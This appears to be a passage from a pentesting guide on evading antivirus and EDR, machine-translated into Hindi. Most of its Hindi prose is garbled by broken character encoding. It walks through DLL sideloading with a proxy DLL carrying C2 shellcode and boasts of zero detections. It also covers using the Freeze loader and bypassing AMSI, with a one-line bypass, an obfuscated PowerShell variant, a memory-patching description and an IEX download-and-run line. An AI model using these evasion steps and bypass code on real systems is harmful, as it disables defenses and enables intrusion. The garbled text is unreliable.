рдореИрдВ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрд╢рдВрд╕рд╛ рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк **DLL рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп/рд╕рд╛рдЗрдбрд▓реЛрдб рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХрд╛ рд╕реНрд╡рдпрдВ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░реЗрдВ**, рдпрд╣ рддрдХрдиреАрдХ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХреА рдЧрдИ рддреЛ рдХрд╛рдлреА рдЫрд┐рдкреА рд╣реБрдИ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЬреНрдЮрд╛рдд DLL рд╕рд╛рдЗрдбрд▓реЛрдб рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдмрд╕ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдХреЛ рдЙрд╕ рдирд╛рдо рдХреЗ рд╕рд╛рде рд░рдЦрдиреЗ рд╕реЗ рдЬреЛ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрд╕ DLL рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ **DLL рдкреНрд░реЙрдХреНрд╕реАрдВрдЧ/рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

**DLL рдкреНрд░реЙрдХреНрд╕реАрдВрдЧ** рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЙрдХреНрд╕реА (рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг) DLL рд╕реЗ рдореВрд▓ DLL рдХреЛ рдХрд┐рдП рдЧрдП рдХреЙрд▓ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦрддреЗ рд╣реБрдП рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдореИрдВ [@flangvik](https://twitter.com/Flangvik/) рдХреЗ [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБред

рдпреЗ рд╡реЗ рдЪрд░рдг рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдореИрдВрдиреЗ рдкрд╛рд▓рди рдХрд┐рдпрд╛:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
рдЕрдВрддрд┐рдо рдХрдорд╛рдВрдб рд╣рдореЗрдВ 2 рдлрд╝рд╛рдЗрд▓реЗрдВ рджреЗрдЧреА: рдПрдХ DLL рд╕реНрд░реЛрдд рдХреЛрдб рдЯреЗрдореНрдкрд▓реЗрдЯ, рдФрд░ рдореВрд▓ рдирд╛рдорд┐рдд DLLред 

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

рд╣рдорд╛рд░рд╛ рд╢реЗрд▓рдХреЛрдб (рдЬрд┐рд╕реЗ [SGN](https://github.com/EgeBalci/sgn) рдХреЗ рд╕рд╛рде рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдФрд░ рдкреНрд░реЙрдХреНрд╕реА DLL рджреЛрдиреЛрдВ рдХрд╛ [antiscan.me](https://antiscan.me) рдореЗрдВ 0/26 рдбрд┐рдЯреЗрдХреНрд╢рди рд░реЗрдЯ рд╣реИ! рдореИрдВ рдЗрд╕реЗ рдПрдХ рд╕рдлрд▓рддрд╛ рдХрд╣реВрдВрдЧрд╛ред

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдореИрдВ **рдЧрдВрднреАрд░рддрд╛ рд╕реЗ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реВрдБ** рдХрд┐ рдЖрдк [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) рдХреЛ DLL Sideloading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджреЗрдЦреЗрдВ рдФрд░ рд╕рд╛рде рд╣реА [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) рдХреЛ рднреА рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЬреЛ рд╣рдордиреЗ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИ, рдЙрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХреЗрдВред

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze рдПрдХ рдкреЗрд▓реЛрдб рдЯреВрд▓рдХрд┐рдЯ рд╣реИ рдЬреЛ рдирд┐рд▓рдВрдмрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ, рд╕реАрдзреЗ syscalls, рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ EDRs рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ`

рдЖрдк Freeze рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ рд╕реЗ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдмрдЪрд╛рд╡ рдХреЗрд╡рд▓ рдПрдХ рдмрд┐рд▓реНрд▓реА рдФрд░ рдЪреВрд╣рд╛ рдЦреЗрд▓ рд╣реИ, рдЬреЛ рдЖрдЬ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рдХрд▓ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрднреА рднреА рдХреЗрд╡рд▓ рдПрдХ рдЙрдкрдХрд░рдг рдкрд░ рдирд┐рд░реНрднрд░ рди рд░рд╣реЗрдВ, рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдХрдИ рдмрдЪрд╛рд╡ рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред

## AMSI (рдПрдВрдЯреА-рдореИрд▓рд╡реЗрдпрд░ рд╕реНрдХреИрди рдЗрдВрдЯрд░рдлреЗрд╕)

AMSI рдХреЛ "[рдлрд╛рдЗрд▓рд▓реЗрд╕ рдореИрд▓рд╡реЗрдпрд░](https://en.wikipedia.org/wiki/Fileless_malware)" рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, AV рдХреЗрд╡рд▓ **рдбрд┐рд╕реНрдХ рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ** рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рддрд░рд╣ **рдкреНрд░рддреНрдпрдХреНрд╖ рдореЗрдореЛрд░реА рдореЗрдВ** рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рдереЗ, рддреЛ AV рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рджреГрд╢реНрдпрддрд╛ рдирд╣реАрдВ рдереАред

AMSI рд╕реБрд╡рд┐рдзрд╛ Windows рдХреЗ рдЗрди рдШрдЯрдХреЛрдВ рдореЗрдВ рдПрдХреАрдХреГрдд рд╣реИред

- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг, рдпрд╛ UAC (EXE, COM, MSI, рдпрд╛ ActiveX рд╕реНрдерд╛рдкрдирд╛ рдХрд╛ рдЙрдиреНрдирдпрди)
- PowerShell (рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рдЙрдкрдпреЛрдЧ, рдФрд░ рдЧрддрд┐рд╢реАрд▓ рдХреЛрдб рдореВрд▓реНрдпрд╛рдВрдХрди)
- Windows Script Host (wscript.exe рдФрд░ cscript.exe)
- JavaScript рдФрд░ VBScript
- Office VBA рдореИрдХреНрд░реЛрдЬрд╝

рдпрд╣ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рд░реВрдк рдореЗрдВ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рди рддреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реИ рдФрд░ рди рд╣реА рдЕрд╕реНрдкрд╖реНрдЯред

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` рдЪрд▓рд╛рдиреЗ рдкрд░ Windows Defender рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд▓рд░реНрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрдЧрд╛ред

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ `amsi:` рдХреЛ рдкрд╣рд▓реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХрд╛ рдкрде рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдИ рдЧрдИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, powershell.exe

рд╣рдордиреЗ рдбрд┐рд╕реНрдХ рдкрд░ рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдирд╣реАрдВ рдЧрд┐рд░рд╛рдИ, рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА AMSI рдХреЗ рдХрд╛рд░рдг рдореЗрдореЛрд░реА рдореЗрдВ рдкрдХрдбрд╝реЗ рдЧрдПред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **.NET 4.8** рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, C# рдХреЛрдб рднреА AMSI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ `Assembly.Load(byte[])` рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рд▓реЛрдб рдХрд░рдиреЗ рдкрд░ рднреА рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк AMSI рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдореЗрдореЛрд░реА рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП .NET рдХреЗ рдирд┐рдореНрди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (рдЬреИрд╕реЗ 4.7.2 рдпрд╛ рдЙрд╕рд╕реЗ рдиреАрдЪреЗ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

- **рдЕрд╕реНрдкрд╖реНрдЯрддрд╛**

рдЪреВрдВрдХрд┐ AMSI рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕реНрдерд┐рд░ рдкрд╣рдЪрд╛рди рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдкрд╣рдЪрд╛рди рд╕реЗ рдмрдЪрдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, AMSI рдХреЗ рдкрд╛рд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ, рднрд▓реЗ рд╣реА рдЗрд╕рдореЗрдВ рдХрдИ рдкрд░рддреЗрдВ рд╣реЛрдВ, рдЗрд╕рд▓рд┐рдП рдЕрд╕реНрдкрд╖реНрдЯрддрд╛ рдПрдХ рдмреБрд░рд╛ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдЗрд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрддрдирд╛ рд╕реАрдзрд╛ рдирд╣реАрдВ рдмрдирд╛рддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрднреА-рдХрднреА, рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдХреБрдЫ рдЪрд░ рдХреЗ рдирд╛рдо рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдЖрдк рдареАрдХ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреБрдЫ рдХрд┐рддрдирд╛ рдЭрдВрдбрд╛ рдЙрдард╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

- **AMSI рдмрд╛рдпрдкрд╛рд╕**

рдЪреВрдВрдХрд┐ AMSI рдХреЛ powershell (рд╕рд╛рде рд╣реА cscript.exe, wscript.exe, рдЖрджрд┐) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ DLL рд▓реЛрдб рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рднрд▓реЗ рд╣реА рдПрдХ рдЕрдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПред AMSI рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдЗрд╕ рджреЛрд╖ рдХреЗ рдХрд╛рд░рдг, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ AMSI рд╕реНрдХреИрдирд┐рдВрдЧ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрд░реАрдХреЗ рдЦреЛрдЬреЗ рд╣реИрдВред

**рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛**

AMSI рдкреНрд░рд╛рд░рдВрднрд┐рдХрдХрд░рдг рдХреЛ рд╡рд┐рдлрд▓ (amsiInitFailed) рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдиреЗ рд╕реЗ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реНрдХреИрди рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЗрд╕реЗ [Matt Graeber](https://twitter.com/mattifestation) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ Microsoft рдиреЗ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИред
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
рдмрд╕ рдПрдХ рдкрдВрдХреНрддрд┐ рдХрд╛ powershell рдХреЛрдб AMSI рдХреЛ рд╡рд░реНрддрдорд╛рди powershell рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкрдпреЛрдЧреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдерд╛ред рдЗрд╕ рдкрдВрдХреНрддрд┐ рдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ AMSI рджреНрд╡рд╛рд░рд╛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдВрд╢реЛрдзрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд AMSI рдмрд╛рдпрдкрд╛рд╕ рд╣реИ рдЬреЛ рдореИрдВрдиреЗ рдЗрд╕ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) рд╕реЗ рд▓рд┐рдпрд╛ рд╣реИред
```bash
Try{#Ams1 bypass technic n┬║ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M├В┬гn├В┬гg' + 'e@+nt.Auto@' + '├В┬гtion.A' -join ''
$fdx = '@ms' + '├В┬гIn├В┬г' + 'tF@├В┬г' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('├В┬г','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('├В┬г','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
рдзреНрдпрд╛рди рд░рдЦреЗрдВ, рдХрд┐ рдпрд╣ рд╕рдВрднрд╡рддрдГ рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реЛрдиреЗ рдкрд░ рдлреНрд▓реИрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХреА рдпреЛрдЬрдирд╛ рдЕрджреГрд╢реНрдп рд░рд╣рдиреЗ рдХреА рд╣реИ рддреЛ рдЖрдкрдХреЛ рдХреЛрдИ рдХреЛрдб рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**Memory Patching**

рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ [@RastaMouse](https://twitter.com/_RastaMouse/) рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЧрдИ рдереА рдФрд░ рдЗрд╕рдореЗрдВ amsi.dll рдореЗрдВ "AmsiScanBuffer" рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ (рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИ) рдФрд░ рдЗрд╕реЗ E_INVALIDARG рдХреЗ рд▓рд┐рдП рдХреЛрдб рд▓реМрдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЗрд╕ рддрд░рд╣, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдХреИрди рдХрд╛ рдкрд░рд┐рдгрд╛рдо 0 рд▓реМрдЯреЗрдЧрд╛, рдЬрд┐рд╕реЗ рдПрдХ рд╕рд╛рдл рдкрд░рд┐рдгрд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

> [!TIP]
> рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) рдкрдврд╝реЗрдВред

AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ рднреА рд╣реИрдВ, [**рдЗрд╕ рдкреГрд╖реНрда**](basic-powershell-for-pentesters/index.html#amsi-bypass) рдФрд░ [**рдЗрд╕ рд░реЗрдкреЛ**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) рдкрд░ рдЬрд╛рдПрдВ рддрд╛рдХрд┐ рдЙрдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХреЗрдВред

рдпрд╣ рдЙрдкрдХрд░рдг [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) рднреА AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред

**Detected signature рдХреЛ рд╣рдЯрд╛рдПрдВ**

рдЖрдк **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** рдФрд░ **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рд╕реЗ рдкрд╣рдЪрд╛рдиреА рдЧрдИ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЙрдкрдХрд░рдг рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдореЗрдВ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рд╕реНрдХреИрди рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ NOP рдирд┐рд░реНрджреЗрд╢реЛрдВ 